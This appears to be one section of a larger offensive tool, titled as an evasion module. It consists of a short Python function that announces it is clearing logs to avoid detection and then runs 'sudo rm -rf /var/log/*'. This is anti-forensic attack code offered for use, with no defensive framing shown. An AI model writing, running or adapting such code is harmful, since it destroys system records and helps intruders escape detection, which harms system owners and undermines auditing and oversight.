7. Evasion Module (modules/evasion.py)

import os

def run():
    print("Clearing logs to avoid detection...")
    os.system("sudo rm -rf /var/log/*")